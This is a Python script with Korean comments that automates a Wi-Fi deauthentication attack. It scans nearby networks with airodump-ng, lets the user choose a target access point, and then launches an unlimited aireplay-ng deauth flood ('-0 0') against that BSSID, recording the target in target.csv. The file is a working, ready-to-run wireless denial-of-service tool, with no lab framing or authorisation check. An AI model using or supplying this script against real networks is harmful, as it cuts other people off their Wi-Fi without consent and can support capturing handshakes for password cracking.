import subprocess
import re
import csv
import time

# 네트워크 인터페이스 목록 가져오기
def get_network_interfaces():
    cmd_result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
    interfaces = re.findall(r'\d+: ([^:]+):', cmd_result.stdout)
    return interfaces

# CSV 파일에서 BSSID, ESSID, 채널 정보 추출
def parse_airodump_csv(csv_filename):
    networks = []
    try:
        with open(csv_filename, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) > 0 and row[0].strip().upper() == 'BSSID':
                    # 네트워크 정보가 시작되는 다음 행으로 이동
                    next(reader)
                    for network_row in reader:
                        if len(network_row) < 2:
                            break  # 네트워크 목록이 끝났으므로 종료
                        bssid = network_row[0].strip()
                        essid = network_row[13].strip()
                        channel = network_row[3].strip()
                        networks.append((bssid, essid, channel))
                        print(f"[{len(networks)}] {bssid}       {essid}       C: {channel}")
    except FileNotFoundError:
        print(f"CSV 파일 '{csv_filename}'을 찾을 수 없습니다. airodump-ng가 데이터를 수집하는 동안 기다려주세요.")
    return networks

# 선택된 네트워크 정보를 target.csv에 저장하고 aireplay-ng 실행
def run_aireplay(bssid, interface, essid):
    # 선택된 네트워크 정보를 target.csv에 저장
    with open("target.csv", "w") as file:
        file.write(f"BSSID,ESSID\n{bssid},{essid}\n")
    
    # aireplay-ng 명령 실행
    aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, interface]
    subprocess.run(aireplay_cmd)

def main():
    # 네트워크 인터페이스 출력
    interfaces = get_network_interfaces()
    for index, interface in enumerate(interfaces, start=1):
        print(f"[{index}] {interface}")
    
    # 사용자 선택
    choice = input("선택할 네트워크 번호 또는 BSSID 입력: ")
    if choice.isdigit():
        selected_interface = interfaces[int(choice)-1]
    else:
        selected_interface = choice

    # CSV 파일 경로 설정
    csv_filename_prefix = "output"
    csv_filename = f"{csv_filename_prefix}-01.csv"

    # airodump-ng 실행 (실행을 위해선 root 권한 필요)
    print(f"airodump-ng를 실행합니다. 인터페이스: {selected_interface}")
    airodump_cmd = ["sudo", "airodump-ng", selected_interface, "--write", csv_filename_prefix, "--output-format", "csv"]
    
    # airodump-ng 비동기 실행 및 프로세스 객체 저장
    airodump_process = subprocess.Popen(airodump_cmd)

    print("airodump-ng가 데이터를 수집 중입니다. 10초 후에 결과를 분석합니다...")
    time.sleep(10)  # 충분한 데이터 수집을 위해 잠시 대기

    # airodump-ng 프로세스 종료
    airodump_process.terminate()
    try:
        airodump_process.wait(timeout=10)
    except subprocess.TimeoutExpired:
        print("airodump-ng 프로세스가 종료되지 않았습니다. 강제 종료합니다.")
        airodump_process.kill()

    print("airodump-ng 데이터 수집을 종료하고 결과를 분석합니다.")
    
    # 네트워크 선택 후 airodump-ng 실행
    networks = parse_airodump_csv(csv_filename)
    choice = input("선택할 네트워크 번호 또는 BSSID 입력: ")
    selected_network = None

    if choice.isdigit():
        selected_network = networks[int(choice) - 1]
    else:
        for network in networks:
            if network[0] == choice:  # BSSID 비교
                selected_network = network
                break

    if selected_network:
        bssid, essid, channel = selected_network
        print(f"선택한 네트워크: BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")
        
        # aireplay-ng 실행 및 target.csv에 기록
        run_aireplay(bssid, selected_interface, essid)

    else:
        print("잘못된 선택입니다.")

# target.csv 파일 읽기
def read_target_csv(csv_filename):
    try:
        with open(csv_filename, mode='r', encoding='utf-8') as file:
            csv_reader = csv.reader(file)
            headers = next(csv_reader)  # 첫 번째 행(헤더) 읽기
            # 헤더 출력 (옵션)
            print(f"{headers[0]}, {headers[1]}")
            # CSV 내용 읽기
            for row in csv_reader:
                bssid, essid = row
                print(f"BSSID: {bssid}, ESSID: {essid}")
    except FileNotFoundError:
        print(f"파일 '{csv_filename}'을 찾을 수 없습니다.")

if __name__ == "__main__":
    main()
    read_target_csv("target.csv")
